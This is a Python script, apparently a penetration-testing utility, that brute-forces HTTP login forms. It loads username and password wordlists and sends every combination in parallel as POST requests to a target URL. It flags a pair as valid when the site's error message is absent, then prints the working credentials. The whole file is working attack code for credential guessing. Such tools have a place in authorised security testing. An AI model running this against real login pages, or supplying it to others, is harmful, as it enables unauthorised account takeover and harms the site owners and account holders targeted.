import requests
from multiprocessing import Pool, cpu_count
from concurrent.futures import ProcessPoolExecutor
import concurrent.futures
import time
from tqdm import tqdm 

def send_request(target, ulabel, plabel, user, password, error):
    try:
        # print(target, ulabel, plabel, user, password, error)
        response = requests.post(target, data={ulabel: user, plabel: password})
        if response.status_code == 200 and error not in response.text:
            return (user, password, True)
        else:
            return (user, password, False)
    except requests.RequestException as e:
        return (user, password, False)

def http_bruteforce(target, ulabel, plabel, userfile, passfile, error, user=None, password=None):
    try:
        tasks = []

        # If we already know the username then only fuzz for password
        if passfile and user:
            with open(passfile, 'r') as f:
                passwords = f.readlines()

            for password in passwords:
                password = password.strip()
                tasks.append((target, ulabel, plabel, user, password, error))

        # If we know the password then only fuzz for username
        elif password and userfile:
            with open(userfile, 'r', encoding='latin-1') as f:
                usernames = f.readlines()

            for user in usernames:
                user = user.strip()
                tasks.append((target, ulabel, plabel, user, password, error))

        # If we don't know the username then fuzz for both username and password
        elif userfile and passfile:
            with open(userfile, 'r') as f:
                users = f.readlines()
            with open(passfile, 'r') as f:
                passwords = f.readlines()

            for user in users:
                user = user.strip()
                for password in passwords:
                    password = password.strip()
                    tasks.append((target, ulabel, plabel, user, password, error))

        else:
            print('\033[91m [-]\033[0m Please provide both username and password files')
            exit(1)

        start_time = time.time()  # Start the timer

        with ProcessPoolExecutor() as executor:
            futures = {executor.submit(send_request,*task):task for task in tasks}
            # print(futures.result())

            for future in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="Processing", unit="task"):
                try:
                    data = future.result()
                    if data[2]:
                        executor.shutdown(wait=False)
                        print(f'\033[92m [+]\033[0m {data[0]} : {data[1]}')
                        break
                    else:
                        # print(f'\033[91m [-]\033[0m {data[0]} : {data[1]}')
                        pass
                except Exception as e:
                    print("Exception", e)

        end_time = time.time()  # End the timer

        total_time = end_time - start_time
        print(f'Total execution time: {total_time:.2f} seconds')

    except KeyboardInterrupt:
        print('\033[91m [-]\033[0m Detecting Keyboard Interrupt...Exiting...')
        exit(1)

# Example usage
# http_bruteforce('http://example.com/login', 'username', 'password', 'usernames.txt', 'passwords.txt', 'Invalid username or password')
